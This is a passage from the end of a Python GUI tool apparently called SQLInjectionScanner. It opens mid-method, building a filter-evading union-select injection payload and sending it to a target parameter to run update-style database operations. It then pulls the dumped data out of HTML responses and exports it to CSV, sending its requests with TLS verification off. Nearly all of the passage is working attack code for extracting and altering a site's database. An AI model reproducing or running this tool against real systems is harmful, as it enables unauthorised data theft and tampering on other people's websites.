                payload = f"-1/*!50000union*/+/*!50000select*/+{select_stmt}--+-"
            
            self.manipulation_status.set(f"Executing {operation_type}...")
            response = self.make_request(self.url, self.param, payload)

            self.log_manipulation(f"{self.url}?{self.param}={payload}")
            
            if response:
                self.log_manipulation(f"✅ {operation_type} executed successfully!")
                self.manipulation_status.set(f"{operation_type} completed")
            else:
                self.log_manipulation(f"❌ {operation_type} failed!")
                self.manipulation_status.set(f"{operation_type} failed")
                
        except Exception as e:
            self.log_manipulation(f"❌ Error: {str(e)}")
            self.manipulation_status.set("Execution error")

    def validate_manipulation_inputs(self):
        """Validate manipulation inputs"""
        if not all([self.url, self.param, self.num_columns, self.injectable_cols]):
            messagebox.showerror("Error", "Please complete SQL injection scan first")
            return False
            
        if not all([self.update_table.get(), self.update_column.get(), self.new_value.get()]):
            messagebox.showerror("Error", "Please fill all required fields")
            return False
            
        return True

    def log_manipulation(self, message):
        """Add message to manipulation results"""
        timestamp = time.strftime("%H:%M:%S")
        self.manipulation_results.insert(END, f"[{timestamp}] {message}\n")
        self.manipulation_results.see(END)

    def extract_multiple_from_html(self, response, expected_columns):
        """Extract multiple columns data from HTML tags"""
        pattern = r'<div class="sqli-data">(.*?)</div>'
        matches = re.findall(pattern, response, re.DOTALL | re.IGNORECASE)
        
        data = []
        for match in matches:
            if match and match != 'null':
                clean_match = html.unescape(match.strip())
                
                # Jika multiple columns dipisah |||
                if '|||' in clean_match:
                    # Split by ||| untuk multiple rows
                    all_data = clean_match.split('|||')
                    # Process each row
                    for i in range(0, len(all_data), expected_columns):
                        row = all_data[i:i+expected_columns]
                        if len(row) == expected_columns:
                            # Clean each cell in the row
                            cleaned_row = [cell.strip() for cell in row]
                            data.append(cleaned_row)
                else:
                    # Single row dengan multiple columns dalam satu string
                    # Coba split by natural separators
                    if expected_columns > 1:
                        # Fallback: treat as single column
                        data.append([clean_match])
                    else:
                        data.append([clean_match])
                        
        return data if data else None

    def extract_single_from_html(self, response):
        """Extract single column data from HTML tags"""
        pattern = r'<div class="sqli-data">(.*?)</div>'
        matches = re.findall(pattern, response, re.DOTALL | re.IGNORECASE)
        
        data = []
        for match in matches:
            if match and match != 'null':
                clean_match = html.unescape(match.strip())
                if (clean_match and len(clean_match) < 100 and 
                    clean_match not in ['1', '2', '3', 'null'] and
                    not clean_match.isdigit()):
                    data.append(clean_match)
                    
        return list(set(data))  # Remove duplicates

    def export_data(self):
        """Export current data to CSV file"""
        if not self.data_tree.get_children():
            messagebox.showwarning("Warning", "No data to export")
            return
            
        # Get columns
        columns = self.data_tree["columns"]
        if not columns:
            return
            
        # Generate CSV content
        csv_content = ",".join(columns) + "\n"
        
        for item in self.data_tree.get_children():
            row_data = self.data_tree.item(item)["values"]
            # Escape commas and quotes in data
            escaped_row = []
            for cell in row_data:
                cell_str = str(cell) if cell is not None else ""
                if ',' in cell_str or '"' in cell_str:
                    cell_str = '"' + cell_str.replace('"', '""') + '"'
                escaped_row.append(cell_str)
            csv_content += ",".join(escaped_row) + "\n"
            
        # Save to file
        filename = f"sql_export_{int(time.time())}.csv"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(csv_content)
            messagebox.showinfo("Success", f"Data exported to {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export: {str(e)}")
        
    def make_request(self, url, param, value):
        """Make HTTP request with the given parameters"""
        try:
            session = requests.Session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            if self.method_var.get() == "GET":
                params = {param: value}
                response = session.get(url, params=params, headers=headers, timeout=10, verify=False)
            else:
                data = {param: value}
                response = session.post(url, data=data, headers=headers, timeout=10, verify=False)
                
            return response.text
            
        except Exception as e:
            if self.verbose_var.get():
                self.log(f"[-] Request failed: {str(e)}")
            return None

def main():
    root = ttkb.Window(themename="darkly")
    app = SQLInjectionScanner(root)
    root.mainloop()

if __name__ == "__main__":
    main()